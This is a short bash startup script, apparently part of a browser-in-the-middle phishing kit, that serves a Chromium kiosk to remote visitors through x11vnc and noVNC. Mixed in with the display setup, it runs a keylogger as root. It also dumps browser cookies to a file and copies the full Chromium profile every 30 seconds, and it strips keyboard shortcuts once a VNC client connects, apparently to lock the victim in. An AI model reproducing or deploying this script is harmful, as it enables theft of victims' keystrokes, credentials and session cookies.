/bin/bash -c /home/user/kiosk.sh &
nohup /bin/bash -c "while true; do if netstat | grep 5900 | grep ESTABLISHED ; then xfconf-query -c xfce4-keyboard-shortcuts -p /commands -r -R; break; fi; done" &
nohup /bin/bash -c "sudo python3 /home/user/keylogger.py &"
nohup /bin/bash -c "while true ; do sleep 30 ; sudo python3 cookies.py > Downloads/Cookies.txt ; done" &
nohup /bin/bash -c "while true ; do sleep 30 ; cp -R /home/user/.config/chromium/Default /home/user/Downloads/ ; done" &
sudo rm -f /tmp/.X${DISPLAY#:}-lock
nohup /usr/bin/Xvfb $DISPLAY -screen 0 $RESOLUTION -ac +extension GLX +render -noreset > /dev/null || true &
while [[ ! $(xdpyinfo -display $DISPLAY 2> /dev/null) ]]; do sleep .3; done
nohup startxfce4 > /dev/null || true &
sudo rm -f ~/.config/xfce4/xfconf/xfce-perchannel-xml/xfce4-keyboard-shortcuts.xml
nohup x11vnc -xkb -noxrecord -noxfixes -noxdamage -many -shared -display $DISPLAY -rfbauth /home/user/.vnc/passwd -rfbport 5900 "$@" &
nohup /home/user/noVNC/utils/novnc_proxy --web /home/user/noVNC/ --vnc localhost:5900 --listen 5980